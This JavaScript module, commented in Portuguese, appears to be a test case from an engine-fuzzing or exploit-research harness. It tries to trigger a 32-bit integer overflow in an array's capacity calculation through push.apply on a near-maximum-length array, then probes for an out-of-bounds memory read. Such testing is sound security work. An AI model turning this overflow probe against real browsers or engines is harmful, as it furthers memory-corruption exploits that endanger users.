export default {
    id:       'ARRAY_MATH_INTEGER_OVERFLOW',
    category: 'Boundary',
    risk:     'CRITICAL',
    description:
        'Força um Integer Overflow no cálculo de capacidade do Butterfly. ' +
        'Usa Array.prototype.push.apply num array com length próximo do limite ' +
        'de 32-bits (0xFFFFFFFF). Execução O(1) para evitar freezes da Main Thread.',

    setup: function() {
        this.results = {};
        this.vulnArray = [];
        
        // 1. Definimos o tamanho perto do limite máximo de um Unsigned Int 32-bits
        this.vulnArray.length = 0xFFFFFFFA; // Faltam apenas 5 posições para estourar o limite
        
        // 2. O Payload que vamos forçar a entrar (8 elementos)
        this.payload = [1.11, 2.22, 3.33, 4.44, 5.55, 6.66, 7.77, 8.88]; 
    },

    trigger: function() {
        try {
            // O GATILHO MATEMÁTICO:
            // O C++ vai somar length (0xFFFFFFFA) + payload.length (8) = 0x100000002.
            // Se o motor usar matemática de 32-bits, ele corta o "1" da frente.
            // O novo tamanho calculado será apenas "2". 
            // O C++ aloca espaço para 2 elementos, mas copia os 8, transbordando o buffer!
            Array.prototype.push.apply(this.vulnArray, this.payload);
        } catch(e) {
            // O Interpretador deve apanhar isto e atirar um RangeError (Invalid array length)
            this.results.error = e.constructor.name;
        }
    },

    probe: [
        // Probe 0: O motor C++ defendeu-se atirando RangeError?
        s => s.results.error || 'Matemática aceite sem erro!',
        
        // Probe 1: Se a matemática foi aceite, o Array corrompeu memória adjacente?
        s => {
            if (!s.results.error) {
                try {
                    // Se o array estourou, o length pode ser um número negativo 
                    // ou os elementos sobrescreveram ponteiros na RAM.
                    let val = s.vulnArray[0xFFFFFFFA + 6]; 
                    if (typeof val === 'number' && !isNaN(val) && val !== 7.77) {
                        return `💥 SUCESSO! OOB Read: 0x${val.toString(16)}`;
                    }
                    return 'Valores esperados (Sem Leak)';
                } catch(e) {
                    return `Crash controlado na leitura`;
                }
            }
            return 'Seguro (RangeError apanhou)';
        }
    ],

    cleanup: function() {
        this.vulnArray = null;
        this.payload = null;
        this.results = {};
    }
};
